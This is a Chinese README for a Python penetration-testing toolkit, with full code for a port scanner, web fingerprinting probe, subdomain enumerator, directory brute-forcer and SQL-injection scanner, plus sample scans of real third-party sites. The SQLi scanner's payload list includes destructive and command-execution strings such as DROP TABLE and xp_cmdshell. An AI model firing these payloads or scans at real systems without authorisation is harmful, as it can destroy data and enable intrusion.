# Small-Tools
Python 网络安全工具，涵盖漏洞扫描、密码破解、渗透测试、数据包嗅探、取证分析等领域。每个工具都添加了 丰富的描述、实现思路，以及核心 Python 库，逐步完善所有代码，请关注官网。

## **一、漏洞扫描工具 🕵️‍♂️🔍**

### **1. 简易端口扫描器 🚪🔑**

**作用**：扫描目标主机的开放端口，识别潜在的服务漏洞。

**关键库**：`socket`, `concurrent.futures`

**实现思路**：

- 使用 `socket` 模块尝试连接目标主机的端口。
- 利用线程池并发扫描多个端口。
- 输出开放端口列表及其服务类型。

```python
import socket
import os
import json
from concurrent.futures import ThreadPoolExecutor, as_completed
from tqdm import tqdm
from ipaddress import ip_address

def validate_host(host):
    """
    验证主机名是否有效。
    :param host: 用户输入的主机名或IP
    :return: 如果主机名有效，返回True，否则返回False
    """
    try:
        socket.gethostbyname(host)  # 尝试解析主机名
        return True
    except socket.gaierror:
        return False

def is_private_ip(ip):
    """
    检查IP是否为内网地址。
    :param ip: IP地址
    :return: 如果是内网IP，返回True，否则返回False
    """
    ip = ip_address(ip)
    return ip.is_private

def parse_port_range(port_range):
    """
    解析用户输入的端口范围。
    :param port_range: 例如 '1-1000'
    :return: 端口范围的生成器
    :raises ValueError: 当格式错误或范围无效时抛出异常
    """
    try:
        start_port, end_port = map(int, port_range.split("-"))
        if start_port < 1 or end_port > 65535 or start_port > end_port:
            raise ValueError
        return range(start_port, end_port + 1)
    except ValueError:
        raise ValueError("端口范围格式错误，必须是 '1-65535' 的形式，且范围有效。")

def scan_port(host, port):
    """
    扫描单个端口是否开放，并尝试获取服务信息。
    :param host: 目标主机
    :param port: 目标端口号
    :return: 如果开放，返回 (端口号, 服务名称, Banner 信息)，否则返回 None
    """
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(2)  # 设置超时时间
            result = s.connect_ex((host, port))  # 检查端口是否开放
            if result == 0:  # 端口开放
                try:
                    service = socket.getservbyport(port)  # 获取服务名称
                except OSError:
                    service = "Unknown"  # 如果无法获取服务名称，则返回 Unknown
                
                # 尝试获取服务的 Banner 信息
                banner = grab_banner(host, port)
                return port, service, banner
    except Exception as e:
        pass  # 忽略其他异常
    return None

def grab_banner(host, port):
    """
    抓取开放端口的服务Banner。
    :param host: 目标主机
    :param port: 目标端口号
    :return: 返回抓取到的服务Banner信息
    """
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(2)
            s.connect((host, port))
            s.sendall(b"\r\n")  # 发送空数据包
            banner = s.recv(1024).decode().strip()  # 接收返回的Banner信息
            return banner if banner else "Unknown"
    except Exception:
        return "Unknown"

def scan_ports(host, ports, max_threads=100):
    """
    并发扫描指定主机的端口。
    :param host: 目标主机
    :param ports: 需要扫描的端口范围
    :param max_threads: 最大线程数
    :return: 开放端口及服务信息的列表
    """
    open_ports = []
    with ThreadPoolExecutor(max_threads) as executor:
        futures = {executor.submit(scan_port, host, port): port for port in ports}
        for future in tqdm(as_completed(futures), total=len(ports), desc=f"扫描 {host}"):
            try:
                result = future.result()
                if result:
                    open_ports.append(result)
                    # 实时显示扫描结果
                    port, service, banner = result
                    print(f"[实时发现] 主机 {host} 端口 {port} 开放: 服务 {service} | Banner: {banner}")
            except Exception as e:
                print(f"扫描时发生错误: {e}")
    return open_ports

def save_results(results, filename="scan_results.json"):
    """
    将扫描结果保存为JSON文件。
    :param results: 扫描结果
    :param filename: 文件名
    """
    try:
        with open(filename, "w") as f:
            json.dump(results, f, indent=4, ensure_ascii=False)
        print(f"扫描结果已保存到 {filename}")
    except Exception as e:
        print(f"保存结果时发生错误: {e}")

def is_admin():
    """
    检查当前用户是否为管理员。
    :return: 如果是管理员返回True，否则返回False
    """
    try:
        return os.getuid() == 0  # Linux 检查是否为 root
    except AttributeError:
        import ctypes
        return ctypes.windll.shell32.IsUserAnAdmin() != 0  # Windows 检查管理员权限

def scan_from_file(file_path):
    """
    从文件读取目标主机和端口范围，批量扫描。
    :param file_path: 文件路径
    """
    try:
        with open(file_path, "r") as f:
            targets = json.load(f)
    except Exception as e:
        print(f"读取文件时发生错误：{e}")
        return

    if not isinstance(targets, list):
        print("文件格式错误：需要包含目标主机和端口范围的列表。")
        return

    all_results = []
    for target in targets:
        host = target.get("host")
        port_range = target.get("ports")
        if not host or not port_range:
            print(f"跳过无效目标：{target}")
            continue

        if not validate_host(host):
            print(f"错误：无法解析主机名 {host}，跳过...")
            continue

        try:
            ports = parse_port_range(port_range)
        except ValueError as ve:
            print(f"错误：目标 {host} 的端口范围无效 - {ve}，跳过...")
            continue

        print(f"\n开始扫描主机 {host} 的端口 {ports.start}-{ports.stop - 1}...\n")
        results = scan_ports(host, ports)
        if results:
            all_results.append({"host": host, "open_ports": results})

    save_results(all_results, "batch_scan_results.json")

def main():
    """
    主函数：用户交互入口，调用扫描功能。
    """
    print("=== 高级端口扫描器 🚪🔑 ===")
    mode = input("请选择模式：1. 单主机扫描  2. 批量扫描（从文件）: ").strip()

    if mode == "1":
        host = input("请输入目标主机（IP 或域名）： ").strip()

        # 验证主机名是否有效
        if not validate_host(host):
            print("错误：无法解析主机名，请检查输入的目标主机地址！")
            return

        # 检查是否扫描公网IP
        if not is_private_ip(socket.gethostbyname(host)):
            confirm = input("目标为公网IP，确定继续扫描？(y/n): ").strip().lower()
            if confirm != "y":
                print("已取消扫描公网IP。")
                return

        port_range = input("请输入端口范围（例如 1-1000）： ").strip()

        # 解析端口范围
        try:
            ports = parse_port_range(port_range)
        except ValueError as ve:
            print(f"错误：{ve}")
            return

        # 提示用户是否具有管理员权限
        if not is_admin():
            print("提示：扫描低号端口（1-1024）可能需要管理员权限，当前用户可能无法扫描这些端口。")

        print(f"\n正在扫描主机 {host} 的端口 {ports.start}-{ports.stop - 1}...\n")

        try:
            # 调用扫描功能
            open_ports = scan_ports(host, ports)
            if open_ports:
                print("\n扫描完成！以下端口开放：\n")
                for port, service, banner in open_ports:
                    print(f"端口 {port}: {service} | Banner: {banner}")
                
                # 保存结果
                save_results({"host": host, "open_ports": open_ports})
            else:
                print("扫描完成！未发现开放端口。")
        except Exception as e:
            print(f"扫描时发生错误：{e}")

    elif mode == "2":
        file_path = input("请输入包含目标的文件路径（JSON 格式）： ").strip()
        scan_from_file(file_path)

    else:
        print("无效选项，退出。")

if __name__ == "__main__":
    main()
```

```
#示例扫描文件
[
    {
        "host": "baidu.com",
        "ports": "80-443"
    },
    {
        "host": "hackerchi.top",
        "ports": "1-1000"
    }
]

#实时返回数据
=== 高级端口扫描器 🚪🔑 ===
请选择模式：1. 单主机扫描  2. 批量扫描（从文件）: 2
请输入包含目标的文件路径（JSON 格式）： scan_list.txt

开始扫描主机 baidu.com 的端口 80-443...

扫描 baidu.com:   0%|▏                                                   | 1/364 [00:01<11:20,  1.87s/it][实时发现] 主机 baidu.com 端口 80 开放: 服务 http | Banner: Unknown
扫描 baidu.com:  83%|█████████████████████████████████████████▎        | 301/364 [00:07<00:01, 43.56it/s][实时发现] 主机 baidu.com 端口 443 开放: 服务 https | Banner: Unknown
扫描 baidu.com: 100%|██████████████████████████████████████████████████| 364/364 [00:08<00:00, 45.29it/s] 

开始扫描主机 hackerchi.top 的端口 1-1000...

扫描 hackerchi.top:   0%|                                                       | 0/1000 [00:00<?, ?it/s][实时发现] 主机 hackerchi.top 端口 80 开放: 服务 http | Banner: Unknown
扫描 hackerchi.top:  42%|██████████████████▉                          | 421/1000 [00:09<00:15, 37.99it/s][实时发现] 主机 hackerchi.top 端口 443 开放: 服务 https | Banner: Unknown
扫描 hackerchi.top: 100%|████████████████████████████████████████████| 1000/1000 [00:20<00:00, 49.40it/s]
扫描结果已保存到 batch_scan_results.json

#文件保存数据
[
    {
        "host": "baidu.com",
        "open_ports": [
            [
                80,
                "http",
                "Unknown"
            ],
            [
                443,
                "https",
                "Unknown"
            ]
        ]
    },
    {
        "host": "hackerchi.top",
        "open_ports": [
            [
                80,
                "http",
                "Unknown"
            ],
            [
                443,
                "https",
                "Unknown"
            ]
        ]
    }
]

```

---

### **2. Web 服务探测工具 🌐🧭**

**作用**：发送 HTTP 请求，检测目标网站的响应状态码和服务指纹。

**关键库**：`requests`

**实现思路**：

- 使用 `requests` 模块发送 `HEAD` 请求，获取响应头信息。
- 分析服务器响应（如 `Server` 字段）来判断服务类型。

```python
import requests
from urllib.parse import urlparse
import json
import ssl
import socket

def validate_url(url):
    """
    验证 URL 是否有效。
    :param url: 用户输入的 URL
    :return: 如果 URL 格式有效，返回 True，否则返回 False
    """
    try:
        result = urlparse(url)
        return all([result.scheme, result.netloc])  # URL 必须包含协议和主机名
    except Exception:
        return False

def send_http_request(url, method="GET", headers=None, allow_redirects=True, timeout=10):
    """
    发送 HTTP 请求，获取响应状态码和头信息。
    :param url: 目标 URL
    :param method: HTTP 方法（默认 GET）
    :param headers: 自定义请求头
    :param allow_redirects: 是否允许重定向
    :param timeout: 超时时间
    :return: 响应状态码、头信息和正文内容
    """
    if headers is None:
        # 默认请求头，模拟真实浏览器
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept": "*/*",
        }

    try:
        response = requests.request(
            method, url, headers=headers, allow_redirects=allow_redirects, timeout=timeout
        )
        return response.status_code, response.headers, response.text
    except requests.exceptions.MissingSchema:
        raise ValueError("URL 缺少协议，请以 http:// 或 https:// 开头！")
    except requests.exceptions.ConnectionError:
        raise ValueError("无法连接到目标 URL，请检查地址是否正确！")
    except requests.exceptions.Timeout:
        raise ValueError("请求超时，目标 URL 响应过慢！")
    except Exception as e:
        raise ValueError(f"发送请求时发生未知错误：{e}")

def fetch_ssl_certificate_info(url):
    """
    获取 HTTPS 网站的 SSL/TLS 证书信息。
    :param url: 目标 URL
    :return: 证书信息字典
    """
    try:
        parsed_url = urlparse(url)
        hostname = parsed_url.netloc.split(":")[0]
        port = 443  # HTTPS 默认端口

        context = ssl.create_default_context()
        with socket.create_connection((hostname, port)) as sock:
            with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                cert = ssock.getpeercert()

        # 提取证书信息
        return {
            "Issuer": dict(x[0] for x in cert.get("issuer", [])),
            "Subject": dict(x[0] for x in cert.get("subject", [])),
            "Valid From": cert.get("notBefore"),
            "Valid Until": cert.get("notAfter"),
            "Serial Number": cert.get("serialNumber"),
            "Version": cert.get("version"),
        }
    except Exception as e:
        return {"Error": f"无法获取 SSL 证书信息：{e}"}

def analyze_content(content):
    """
    分析响应内容，判断页面类型或特征。
    :param content: 响应正文内容
    :return: 页面内容的类型信息
    """
    content = content.lower()
    if "<html" in content:
        if "login" in content or "sign in" in content:
            return "Login Page - 页面包含登录表单。"
        elif "error" in content or "not found" in content:
            return "Error Page - 页面可能是错误页。"
        elif "<div" in content or "<span" in content:
            return "HTML Page - 一般的 HTML 页面。"
    elif "json" in content or "{" in content:
        return "API Response - 页面返回 JSON 数据，可能是 API 响应。"
    elif "<svg" in content or "<circle" in content:
        return "SVG File - 页面返回 SVG 图像。"
    return "Unknown Content - 无法识别的页面内容。"

def interpret_status_code(status_code):
    """
    对 HTTP 状态码进行解释。
    :param status_code: HTTP 状态码
    :return: 状态码的解释信息
    """
    explanations = {
        200: "OK - 请求成功，服务器返回了请求的资源。",
        201: "Created - 请求成功并创建了新的资源。",
        204: "No Content - 请求成功，但服务器未返回内容。",
        301: "Moved Permanently - 资源永久重定向到新的 URL。",
        302: "Found - 资源临时重定向到新的 URL。",
        304: "Not Modified - 缓存的资源未改变，返回未修改的副本。",
        400: "Bad Request - 请求格式错误，服务器无法理解。",
        401: "Unauthorized - 未授权，需要身份验证。",
        403: "Forbidden - 服务器拒绝执行请求。",
        404: "Not Found - 请求的资源不存在。",
        405: "Method Not Allowed - 请求方法被禁止。",
        408: "Request Timeout - 请求超时，服务器未收到完整请求。",
        500: "Internal Server Error - 服务器发生未知错误。",
        502: "Bad Gateway - 网关或代理服务器收到无效响应。",
        503: "Service Unavailable - 服务器暂时不可用（过载或维护中）。",
        504: "Gateway Timeout - 网关或代理超时。",
    }
    return explanations.get(status_code, "Unknown Status Code - 未知状态码。")

def interpret_server_type(server):
    """
    对服务器类型进行解释。
    :param server: 服务器类型（响应头中的 Server 字段）
    :return: 服务器类型的解释信息
    """
    server_types = {
        "nginx": "Nginx - 一种高性能的开源 HTTP 和反向代理服务器，常用于负载均衡。",
        "apache": "Apache - 世界上最流行的开源 Web 服务器，功能强大且灵活。",
        "iis": "IIS - 微软开发的 Internet 信息服务，常用于运行 ASP.NET 应用程序。",
        "cloudflare": "Cloudflare - 一种 CDN 和网络安全服务，通常用于增强网站性能和安全性。",
        "gws": "Google Web Server - 谷歌使用的专属 Web 服务器，提供高性能服务。",
        "litespeed": "LiteSpeed - 一种轻量级高性能 Web 服务器，专为速度优化。",
        "openresty": "OpenResty - 基于 Nginx 的高性能 Web 平台，可扩展用于动态 Web 应用。",
        "caddy": "Caddy - 一种自动化 HTTPS、高性能的 Web 服务器，适合开发者。",
        "gunicorn": "Gunicorn - 一个基于 Python 的 WSGI HTTP 服务器，用于运行 Python Web 应用。",
    }
    for key, explanation in server_types.items():
        if key in server.lower():
            return explanation
    return "Unknown - 无法确定的服务器类型。"

def single_probe(url):
    """
    针对单个 URL 的探测，并实时输出重点内容。
    :param url: 单个目标 URL
    :return: 探测结果字典
    """
    try:
        print(f"\n正在探测：{url}")
        status_code, headers, content = send_http_request(url)

        # 提取信息
        status_explanation = interpret_status_code(status_code)
        server = headers.get("Server", "Unknown")
        server_explanation = interpret_server_type(server)
        content_analysis = analyze_content(content)

        # 获取 SSL 信息（如果是 HTTPS）
        ssl_info = fetch_ssl_certificate_info(url) if url.startswith("https://") else {}

        # 实时输出重点内容
        print(f"状态码：{status_code} - {status_explanation}")
        print(f"服务器类型：{server} - {server_explanation}")
        print(f"页面内容分析：{content_analysis}")
        if ssl_info:
            print("SSL/TLS 证书信息：")
            for key, value in ssl_info.items():
                print(f"  {key}: {value}")

        # 返回结果
        return {
            "URL": url,
            "Status Code": status_code,
            "Status Explanation": status_explanation,
            "Server": server,
            "Server Explanation": server_explanation,
            "Content Analysis": content_analysis,
            "SSL Info": ssl_info,
        }
    except ValueError as ve:
        print(f"错误：{ve}")
        return {"URL": url, "Error": str(ve)}
    except Exception as e:
        print(f"未知错误：{e}")
        return {"URL": url, "Error": str(e)}

def batch_probe(urls):
    """
    批量探测多个 URL，并实时输出重点内容。
    :param urls: URL 列表
    :return: 每个 URL 的探测结果（列表）
    """
    results = []
    for url in urls:
        result = single_probe(url)
        results.append(result)
    return results

def save_results(results, filename="web_probe_results.json"):
    """
    将探测结果保存为 JSON 文件。
    :param results: 探测结果
    :param filename: 文件名
    """
    try:
        with open(filename, "w") as f:
            json.dump(results, f, indent=4, ensure_ascii=False)
        print(f"探测结果已保存到文件：{filename}")
    except Exception as e:
        print(f"保存结果时发生错误：{e}")

def load_urls_from_file(filename):
    """
    从文件中加载 URL 列表。
    :param filename: 文件名
    :return: URL 列表
    """
    try:
        with open(filename, "r") as f:
            urls = [line.strip() for line in f if line.strip()]
        if not urls:
            raise ValueError("文件中没有有效的 URL！")
        return urls
    except FileNotFoundError:
        print(f"错误：文件 {filename} 不存在！")
        return []
    except Exception as e:
        print(f"加载文件时发生错误：{e}")
        return []

def main():
    """
    主函数：用户交互入口，支持单个 URL 探测和批量 URL 探测。
    """
    print("=== Web 服务探测工具 🌐🛠 ===")
    mode = input("请选择模式（1: 单个 URL 探测，2: 批量 URL 探测）： ").strip()

    if mode == "1":
        # 单个 URL 探测
        url = input("请输入目标 URL（例如 https://example.com）： ").strip()
        if not validate_url(url):
            print("错误：输入的 URL 无效，请输入有效的 URL！")
            return
        single_probe(url)
    elif mode == "2":
        # 批量 URL 探测
        filename = input("请输入包含 URL 列表的文件名： ").strip()
        urls = load_urls_from_file(filename)
        if not urls:
            return

        print(f"\n共加载 {len(urls)} 个 URL，正在探测中...\n")
        results = batch_probe(urls)
        save_results(results)
    else:
        print("错误：无效的模式选择！")

if __name__ == "__main__":
    main()
```

```
#实例网址文件
https://www.baidu.com

#测试返回数据
[
    {
        "URL": "https://www.baidu.com",
        "Status Code": 200,
        "Status Explanation": "OK - ����ɹ����������������������Դ��",
        "Server": "BWS/1.1",
        "Server Explanation": "Unknown - �޷�ȷ���ķ��������͡�",
        "Content Analysis": "Login Page - ҳ�������¼������",
        "SSL Info": {
            "Issuer": {
                "countryName": "BE",
                "organizationName": "GlobalSign nv-sa",
                "commonName": "GlobalSign RSA OV SSL CA 2018"
            },
            "Subject": {
                "countryName": "CN",
                "stateOrProvinceName": "beijing",
                "localityName": "beijing",
                "organizationName": "Beijing Baidu Netcom Science Technology Co., Ltd",
                "commonName": "baidu.com"
            },
            "Valid From": "Jul  8 01:41:02 2024 GMT",
            "Valid Until": "Aug  9 01:41:01 2025 GMT",
            "Serial Number": "4E4003A65EB681F87F4BD8EB",
            "Version": 3
        }
    }
```

---

### **3. 子域名枚举工具 🌍📡**

**作用**：发现目标域名的子域名，辅助后续攻击。

**关键库**：`socket`, `itertools`

**实现思路**：

- 使用常见的子域字典生成可能的子域组合。
- 通过 DNS 查询验证子域是否存在（如解析成功）。

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import socket
from concurrent.futures import ThreadPoolExecutor, as_completed
import os

def dns_lookup(subdomain):
    try:
        # 执行 A 记录查询
        socket.gethostbyname(subdomain)
        return True
    except socket.gaierror:
        # 域名没有 IP 地址或者该记录不是 A 记录
        return False

def generate_subdomains(target_domain, wordlist):
    with open(wordlist, 'r', encoding='utf-8') as file:
        for line in file.readlines():
            yield '{}.{}'.format(line.strip(), target_domain)

def generate_common_subdomains(target_domain):
    common_prefixes = [
        "www", "mail", "admin", "test", "dev", "staging",
        "ftp", "blog", "api", "support", "forum", "shop"
    ]
    for prefix in common_prefixes:
        yield '{}.{}'.format(prefix, target_domain)

def main():
    # 用户输入目标域名
    target_domain = input("请输入要扫描的目标域名（例如 example.com）：").strip()
    
    if not target_domain:
        print("未输入有效的域名。")
        return
    
    # 生成子域名列表
    subdomains = set()
    
    # 使用预定义的常见子域前缀
    subdomains.update(generate_common_subdomains(target_domain))
    
    # 如果存在自定义字典文件，则添加这些子域
    wordlist_path = 'wordlist.txt'
    if os.path.exists(wordlist_path):
        print(f"使用自定义字典文件 {wordlist_path} 生成更多子域名。")
        subdomains.update(generate_subdomains(target_domain, wordlist_path))
    else:
        print("未找到自定义字典文件，仅使用预定义的常见子域前缀。")
    
    # 进行 DNS 查询
    with ThreadPoolExecutor(max_workers=100) as executor:
        futures = {executor.submit(dns_lookup, subdomain): subdomain for subdomain in subdomains}
        
        for future in as_completed(futures):
            subdomain = futures[future]
            try:
                if future.result():
                    print('[+] {} 存在'.format(subdomain))
                else:
                    print('[-] {} 不存在'.format(subdomain))
            except Exception as e:
                print('[-] 查询 {} 时发生错误: {}'.format(subdomain, e))

if __name__ == '__main__':
    main()
    
```

```python
#自定义字典
www
mail
admin
test
dev
staging
ftp
blog
api
support
forum
shop
```

![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/dcfc0b10-f3f6-4bfe-a7f8-895b46badeca/3294c5c5-2d0a-4fc7-9251-17a9d9c1ddfb/image.png)

---

### **4. 文件与目录枚举工具 📂🗂️**

**作用**：扫描目标服务器的隐藏文件或目录。

**关键库**：`requests`

**实现思路**：

- 使用路径字典（如 `/admin`, `/backup.zip`）枚举可能路径。
- 检查 HTTP 响应是否为 200 或 403，判断资源是否存在。

```python
import requests

# 定义目标URL和默认路径字典
target_url = "http://example.com"
default_paths_to_test = [
    "/admin",
    "/backup.zip",
    "/.htaccess",
    "/config.php",
    "/robots.txt",
    # 添加更多可能的路径
]

def enum_files_and_dirs(base_url, paths, custom_dict=None):
    if custom_dict:
        paths += custom_dict

    for path in paths:
        full_url = f"{base_url}{path}"
        try:
            response = requests.get(full_url)
            status_code = response.status_code
            if status_code == 200:
                print(f"[+] Found: {full_url} (Status Code: {status_code})")
            elif status_code == 403:
                print(f"[!] Forbidden: {full_url} (Status Code: {status_code})")
            elif status_code == 401:
                print(f"[!] Unauthorized: {full_url} (Status Code: {status_code})")
            elif status_code == 404:
                pass  # 静默忽略404状态码，表示资源不存在
            else:
                print(f"[-] Other: {full_url} (Status Code: {status_code})")
        except requests.RequestException as e:
            print(f"[-] Error accessing {full_url}: {e}")

if __name__ == "__main__":
    # 使用默认路径字典进行扫描
    enum_files_and_dirs(target_url, default_paths_to_test)
    
    # 如果需要使用自定义路径字典，可以传递一个列表给custom_dict参数
    custom_paths = [
        "/secret",
        "/hidden",
        "/.git",
        # 添加更多自定义路径
    ]
    enum_files_and_dirs(target_url, default_paths_to_test, custom_dict=custom_paths)
```

![不能突破网站的防恶意检测，有误报。](https://prod-files-secure.s3.us-west-2.amazonaws.com/dcfc0b10-f3f6-4bfe-a7f8-895b46badeca/173fcbc4-245a-47c3-add5-9518fec55a71/image.png)

不能突破网站的防恶意检测，有误报。

---

### **5. SQL 注入检测工具 💉🗄️**

**作用**：检测目标网站是否存在 SQL 注入漏洞。

**关键库**：`requests`, `re`

**实现思路**：

- 构造常见的 SQL 注入 Payload（如 `' OR 1=1 --`）。
- 检测返回页面是否包含数据库错误信息或异常。

```python
#SQL注入检测工具
import requests
import re
from urllib.parse import urljoin, quote
import time
import json
from typing import Dict, List, Tuple
from dataclasses import dataclass
from enum import Enum

class VulnType(Enum):
    ERROR_BASED = "错误注入"
    UNION_BASED = "联合查询注入"
    BOOLEAN_BASED = "布尔注入"
    TIME_BASED = "时间盲注"
    STACK_QUERY = "堆叠查询注入"
    BLIND = "盲注"

@dataclass
class VulnResult:
    type: VulnType
    parameter: str
    payload: str
    description: str
    poc: str
    risk_level: str
    details: Dict
    recommendations: List[str]

class SQLInjectionScanner:
    def __init__(self):
        self._load_payloads()
        self._load_patterns()
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        self.timeout = 10
        self.delay = 0.5

    def _load_payloads(self):
        # 分类存储不同类型的payload
        self.payloads = {
            VulnType.ERROR_BASED: [
                "'''", 
                "'))", 
                "\"\"\"",
                "%%",
                "--", 
                "#",
                "/*!12345SELECT*/",
            ],
            VulnType.UNION_BASED: [
                " UNION ALL SELECT NULL--",
                " UNION ALL SELECT NULL,NULL--",
                " UNION ALL SELECT NULL,NULL,NULL--",
                ") UNION SELECT NULL,NULL,NULL--",
                "' UNION SELECT version(),user(),database()--",
            ],
            VulnType.BOOLEAN_BASED: [
                "' AND '1'='1",
                "' AND '1'='2",
                "' OR '1'='1",
                "1' AND sleep(0)='0",
                "1' AND 1=1--",
            ],
            VulnType.TIME_BASED: [
                "'; WAITFOR DELAY '0:0:5'--",
                "'); WAITFOR DELAY '0:0:5'--",
                "' OR sleep(5)--",
                "' AND sleep(5)--",
                "BENCHMARK(5000000,MD5(1))",
            ],
            VulnType.STACK_QUERY: [
                "; DROP TABLE temp--",
                "; SELECT @@version--",
                "; EXEC xp_cmdshell 'ping 127.0.0.1'--",
            ]
        }

    def _load_patterns(self):
        self.error_patterns = {
            'mysql': [
                r"SQL syntax.*?MySQL",
                r"Warning.*?\Wmysqli?_",
                r"MySQLSyntaxErrorException",
                r"valid MySQL result",
                r"check the manual that (corresponds to|fits) your MySQL server version",
            ],
            'postgresql': [
                r"PostgreSQL.*?ERROR",
                r"Warning.*?\Wpg_",
                r"valid PostgreSQL result",
                r"Npgsql\.",
            ],
            'mssql': [
                r"Driver.*? SQL[\-\_\ ]*Server",
                r"OLE DB.*? SQL Server",
                r"\bSQL Server[^&lt;&quot;]+Driver",
                r"Warning.*?\W(mssql|sqlsrv)_",
                r"\bSQL Server[^&lt;&quot;]+[0-9a-fA-F]{8}",
            ],
            'oracle': [
                r"\bORA-[0-9][0-9][0-9][0-9]",
                r"Oracle error",
                r"Oracle.*?Driver",
                r"Warning.*?\W(oci|ora)_",
            ],
            'sqlite': [
                r"SQLite/JDBCDriver",
                r"SQLite\.Exception",
                r"System\.Data\.SQLite\.SQLiteException",
                r"Warning.*?\Wsqlite_",
            ]
        }

    def scan_url(self, url: str) -> List[VulnResult]:
        print(f"\n[*] 开始扫描: {url}")
        results = []
        
        try:
            # 基础信息收集
            base_response = self._send_request(url)
            base_length = len(base_response.text) if base_response else 0
            
            # 获取参数列表
            params = self._get_parameters(url)
            if not params:
                params = ['id', 'page', 'user', 'username', 'search']
            
            # 测试每个参数
            for param in params:
                param_results = self._test_parameter(url, param, base_length)
                results.extend(param_results)
                
        except Exception as e:
            print(f"[!] 扫描过程中出错: {str(e)}")
            
        return self._analyze_results(results)

    def _test_parameter(self, url: str, param: str, base_length: int) -> List[VulnResult]:
        results = []
        print(f"[+] 测试参数: {param}")

        for vuln_type, payloads in self.payloads.items():
            for payload in payloads:
                try:
                    test_url = self._inject_payload(url, param, payload)
                    start_time = time.time()
                    response = self._send_request(test_url)
                    response_time = time.time() - start_time
                    
                    if not response:
                        continue

                    result = self._check_vulnerability(
                        vuln_type,
                        param,
                        payload,
                        response,
                        base_length,
                        response_time
                    )
                    
                    if result:
                        results.append(result)
                        
                except Exception as e:
                    print(f"[!] 测试payload时出错: {str(e)}")
                    continue
                
                time.sleep(self.delay)
        
        return results

    def _check_vulnerability(
        self, 
        vuln_type: VulnType,
        param: str,
        payload: str,
        response,
        base_length: int,
        response_time: float
    ) -> VulnResult:
        
        # 检测基于错误的注入
        if vuln_type == VulnType.ERROR_BASED:
            for dbms, patterns in self.error_patterns.items():
                for pattern in patterns:
                    if re.search(pattern, response.text, re.I):
                        return VulnResult(
                            type=vuln_type,
                            parameter=param,
                            payload=payload,
                            description=f"发现{dbms}数据库错误信息泄露",
                            poc=f"{param}={payload}",
                            risk_level="高",
                            details={
                                "数据库类型": dbms,
                                "错误信息": re.search(pattern, response.text, re.I).group(0)
                            },
                            recommendations=[
                                "1. 关闭生产环境的错误显示",
                                "2. 使用参数化查询",
                                "3. 实施输入验证和转义"
                            ]
                        )

        # 检测基于时间的注入
        if vuln_type == VulnType.TIME_BASED and response_time > 5:
            return VulnResult(
                type=vuln_type,
                parameter=param,
                payload=payload,
                description="发现基于时间的SQL注入漏洞",
                poc=f"{param}={payload}",
                risk_level="中",
                details={
                    "响应时间": f"{response_time:.2f}秒"
                },
                recommendations=[
                    "1. 使用参数化查询",
                    "2. 限制SQL语句执行时间",
                    "3. 实施WAF防护"
                ]
            )

        # 检测基于联合查询的注入
        if vuln_type == VulnType.UNION_BASED:
            if len(response.text) > base_length * 2 or 'UNION' in response.text:
                return VulnResult(
                    type=vuln_type,
                    parameter=param,
                    payload=payload,
                    description="发现基于UNION的SQL注入漏洞",
                    poc=f"{param}={payload}",
                    risk_level="高",
                    details={
                        "响应长度": len(response.text),
                        "基准长度": base_length
                    },
                    recommendations=[
                        "1. 使用ORM或参数化查询",
                        "2. 实施输入验证",
                        "3. 最小权限原则配置数据库账号"
                    ]
                )

        # 检测布尔注入
        if vuln_type == VulnType.BOOLEAN_BASED:
            true_payload = payload.replace("'1'='2", "'1'='1")
            false_payload = payload.replace("'1'='1", "'1'='2")
            
            true_response = self._send_request(self._inject_payload(response.url, param, true_payload))
            false_response = self._send_request(self._inject_payload(response.url, param, false_payload))
            
            if true_response and false_response and \
               abs(len(true_response.text) - len(false_response.text)) > 100:
                return VulnResult(
                    type=vuln_type,
                    parameter=param,
                    payload=payload,
                    description="发现基于布尔的SQL注入漏洞",
                    poc=f"{param}={payload}",
                    risk_level="中",
                    details={
                        "TRUE响应长度": len(true_response.text),
                        "FALSE响应长度": len(false_response.text)
                    },
                    recommendations=[
                        "1. 使用参数化查询",
                        "2. 实施输入验证",
                        "3. 统一错误响应"
                    ]
                )

        return None

    def _send_request(self, url: str) -> requests.Response:
        try:
            return requests.get(
                url,
                headers=self.headers,
                timeout=self.timeout,
                verify=False
            )
        except:
            return None

    def _get_parameters(self, url: str) -> List[str]:
        params = []
        if '?' in url:
            query = url.split('?')[1]
            for param in query.split('&'):
                if '=' in param:
                    params.append(param.split('=')[0])
        return params

    def _inject_payload(self, url: str, param: str, payload: str) -> str:
        encoded_payload = quote(payload)
        if '?' not in url:
            return f"{url}?{param}={encoded_payload}"
        
        base_url = url.split('?')[0]
        query = url.split('?')[1]
        new_params = []
        param_found = False
        
        for p in query.split('&'):
            if p.startswith(f"{param}="):
                new_params.append(f"{param}={encoded_payload}")
                param_found = True
            else:
                new_params.append(p)
        
        if not param_found:
            new_params.append(f"{param}={encoded_payload}")
        
        return f"{base_url}?{'&'.join(new_params)}"

    def _analyze_results(self, results: List[VulnResult]) -> List[VulnResult]:
        # 去重和结果分析
        unique_results = {}
        for result in results:
            key = f"{result.type}_{result.parameter}"
            if key not in unique_results:
                unique_results[key] = result
            
        return list(unique_results.values())

def main():
    scanner = SQLInjectionScanner()
    url = input("请输入要扫描的URL: ")
    
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    
    results = scanner.scan_url(url)
    
    if results:
        print("\n[!] 扫描报告")
        print("=" * 50)
        
        for i, result in enumerate(results, 1):
            print(f"\n漏洞 #{i}")
            print(f"类型: {result.type.value}")
            print(f"参数: {result.parameter}")
            print(f"描述: {result.description}")
            print(f"风险等级: {result.risk_level}")
            print(f"POC: {result.poc}")
            print("\n详细信息:")
            for k, v in result.details.items():
                print(f"  {k}: {v}")
            print("\n修复建议:")
            for rec in result.recommendations:
                print(f"  {rec}")
            print("-" * 50)
    else:
        print("\n[+] 未发现明显的SQL注入漏洞")

if __name__ == "__main__":
    main()
    
```
